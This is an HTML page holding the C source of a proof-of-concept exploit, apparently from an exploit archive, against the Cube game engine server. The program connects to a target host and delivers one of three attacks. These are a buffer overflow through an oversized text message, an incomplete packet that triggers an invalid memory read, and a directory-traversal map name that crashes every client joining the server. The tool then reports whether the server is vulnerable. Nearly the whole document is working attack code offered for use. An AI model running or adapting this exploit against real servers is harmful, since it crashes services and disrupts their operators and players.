<html><head><title>Cube <= 2005_08_29 Multiple BoF/Crash Vulnerabilities Exploit</title></head><pre>/*

by Luigi Auriemma

You NEED Enet for compiling this tool (then remember -lenet)
  http://enet.bespin.org / http://enet.cubik.org

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;enet/enet.h&gt;



#define VER         &quot;0.1&quot;
#define PORT        28765
#define MAXTRANS    5000
#define BOFSZ       (MAXTRANS + 2400)
#define MAPSUX      &quot;base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../readme.txt&quot;



// when encoding is activated (all the pre-compiled client/server) the valid
// tag types are 0, 9, 11, 18, 19, 20, 23, 24, 26, 31 instead of the following
// values

enum {
    SV_INITS2C, SV_INITC2S, SV_POS, SV_TEXT, SV_SOUND, SV_CDIS,
    SV_DIED, SV_DAMAGE, SV_SHOT, SV_FRAGS,
    SV_TIMEUP, SV_EDITENT, SV_MAPRELOAD, SV_ITEMACC,
    SV_MAPCHANGE, SV_ITEMSPAWN, SV_ITEMPICKUP, SV_DENIED,
    SV_PING, SV_PONG, SV_CLIENTPING, SV_GAMEMODE,
    SV_EDITH, SV_EDITT, SV_EDITS, SV_EDITD, SV_EDITE,
    SV_SENDMAP, SV_RECVMAP, SV_SERVMSG, SV_ITEMLIST,
    SV_EXT,
}; 

void putint(u_char *p, int n, u_char **out) {
    if(n&lt;128 &amp;&amp; n&gt;-127) { *p++ = n; }
    else if(n&lt;0x8000 &amp;&amp; n&gt;=-0x8000) { *p++ = 0x80; *p++ = n; *p++ = n&gt;&gt;8;  }
    else { *p++ = 0x81; *p++ = n; *p++ = n&gt;&gt;8; *p++ = n&gt;&gt;16; *p++ = n&gt;&gt;24; };
    *out = p;
};

int getint(u_char *p, u_char **out) {
    int c = *((char *)p);
    p++;
    if(c==-128) { int n = *p++; n |= *((char *)p)&lt;&lt;8; p++; *out = p; return n;}
    else if(c==-127) { int n = *p++; n |= *p++&lt;&lt;8; n |= *p++&lt;&lt;16; *out = p; return n|(*p++&lt;&lt;24); } 
    else { *out = p; return c; }
};

void sendstring(char *t, u_char *p, u_char **out) {
    while(*t) putint(p, *t++, &amp;p);
    putint(p, 0, &amp;p);
    *out = p;
};



enet_uint32 myinetaddr(u_char *ip);
void cubeenc(u_char *data, int size);
char *myineta(u_int ip);



int main(int argc, char *argv[]) {
    ENetAddress address;
    ENetEvent   event;
    ENetPeer    *peer;
    ENetHost    *client;
    ENetPacket  *packet;
    int         enc = 0,
                len,
                attack;
    u_short     port = PORT;
    u_char      buff[8192],
                mybof[BOFSZ],
                *p;

    setbuf(stdout, NULL);

    fputs(&quot;\n&quot;
        &quot;Cube &lt;= 2005_08_29 multiple vulnerabilities &quot;VER&quot;\n&quot;
        &quot;by Luigi Auriemma\n&quot;
        &quot;e-mail: aluigi@autistici.org\n&quot;
        &quot;web:    http://aluigi.altervista.org\n&quot;
        &quot;\n&quot;, stdout);

    if(argc &lt; 3) {
        printf(&quot;\n&quot;
            &quot;Usage: %s &lt;attack&gt; &lt;host&gt; [port(%hu)]\n&quot;
            &quot;\n&quot;
            &quot;Attack:\n&quot;
            &quot;1 = sgetstr() buffer-overflow\n&quot;
            &quot;2 = invalid memory access during data reading (getint and sgetstr)\n&quot;
            &quot;3 = crash of any client which will join the server through malformed map\n&quot;
            &quot;    loaded with directory traversal vulnerability and 260 bytes limit\n&quot;
            &quot;\n&quot;,
            argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);

    if(enet_initialize()) {
        printf(&quot;\nError: an error occurred while initializing ENet\n&quot;);
        exit(1);
    }

    client = enet_host_create(
        NULL        /* create a client host */,
        1           /* only allow 1 outgoing connection */,
        57600 / 8   /* 56K modem with 56 Kbps downstream bandwidth */,
        14400 / 8   /* 56K modem with 14 Kbps upstream bandwidth */);

    if(!client) {
        printf(&quot;An error occurred while trying to create an ENet client host.\n&quot;);
        exit(1);
    }

    if(argc &gt; 3) port = atoi(argv[3]);
    if(enet_address_set_host(&amp;address, argv[2]) &lt; 0) {
        address.host = myinetaddr(argv[2]);
    }
    address.port = port;

    printf(&quot;- target   %s : %hu\n&quot;,
        myineta(address.host),
        address.port);

    peer = enet_host_connect(client, &amp;address, 2);    
    if(!peer) {
       printf(&quot;\nError: no peers available for initiating an ENet connection\n&quot;);
       exit(1);
    }

    printf(&quot;- connect...&quot;);
    if((enet_host_service(client, &amp;event, 5000) &gt; 0) &amp;&amp; (event.type == ENET_EVENT_TYPE_CONNECT)) {
        printf(&quot;ok\n&quot;);
    } else {
        printf(&quot;failed!\n&quot;);
        goto quit;
    }

    if((enet_host_service(client, &amp;event, 3000) &gt; 0) &amp;&amp; (event.type == ENET_EVENT_TYPE_RECEIVE)) {
        if(event.packet-&gt;data[2] &gt; SV_EXT) enc = 1;
        enet_packet_destroy(event.packet);
    }

    p = buff + 2;

    if(attack == 1) {
        printf(&quot;- send buffer-overflow data (%d bytes)\n&quot;, BOFSZ);
        putint(p, enc ? 9 : SV_TEXT, &amp;p);
        memset(mybof, 'A', sizeof(mybof) - 1);
        mybof[sizeof(mybof) - 1] = 0;
        sendstring(mybof, p, &amp;p);

    } else if(attack == 2) {
        printf(&quot;- send incomplete data (the server will do a reading loop in SV_EXT)\n&quot;);
        putint(p, enc ? 31 : SV_EXT, &amp;p);
        putint(p, -1, &amp;p);
        // for(int n = getint(p); n; n--) getint(p);

    } else if(attack == 3) {
        printf(&quot;- send bad map\n&quot;);
        putint(p, enc ? 9 : SV_MAPCHANGE, &amp;p);
        sendstring(MAPSUX, p, &amp;p);
        putint(p, 0, &amp;p);
    }

    len = p - buff;
    *(u_short *)buff = htons(len);

    if(enc) {
        printf(&quot;- Cube xor encoding activated\n&quot;);
        cubeenc(buff + 2, len - 2);
    }

    packet = enet_packet_create(
        buff, 
        len, 
        ENET_PACKET_FLAG_RELIABLE);

    enet_peer_send(peer, 0, packet);
    enet_host_flush(client);
    if((enet_host_service(client, &amp;event, 3000) &gt; 0) &amp;&amp;(event.type == ENET_EVENT_TYPE_RECEIVE)) {
        enet_packet_destroy(event.packet);
    }

    enet_peer_disconnect(peer);

    if(attack == 3) {
        printf(
            &quot;- if the server was empty the map has been accepted\n&quot;
            &quot;  any client which will join the server will exit immediately\n&quot;);
        goto quit;
    }

    printf(&quot;- check server:\n&quot;);
    if(enet_host_service(client, &amp;event, 5000) &gt; 0) {
        printf(&quot;\n  Server does not seem vulnerable\n\n&quot;);
    } else {
        printf(&quot;\n  Server IS vulnerable!!!\n\n&quot;);
    }

    enet_peer_disconnect(peer);

quit:
    enet_peer_reset(peer);
    enet_deinitialize();
    return(0);
}



void cubeenc(u_char *data, int size) {
    u_char  *end;

    for(end = data + size; data != end; data++) {
        *data ^= 'a';
    }
}



enet_uint32 myinetaddr(u_char *ip) {
    unsigned    ip1,
                ip2,
                ip3,
                ip4;

    sscanf(ip, &quot;%d.%d.%d.%d&quot;, &amp;ip1, &amp;ip2, &amp;ip3, &amp;ip4);
    return(ENET_HOST_TO_NET_32((ip1 &lt;&lt; 24) | (ip2 &lt;&lt; 16) | (ip3 &lt;&lt; 8) | ip4));
}



char *myineta(u_int ip) {
    static  char    ipc[16];

    ip = ntohl(ip);
    sprintf(
        ipc,
        &quot;%hhu.%hhu.%hhu.%hhu&quot;,
        (ip &gt;&gt; 24) &amp; 0xff,
        (ip &gt;&gt; 16) &amp; 0xff,
        (ip &gt;&gt; 8)  &amp; 0xff,
        (ip  &amp; 0xff));
    return(ipc);
}

// milw0rm.com [2006-03-06]</pre></html>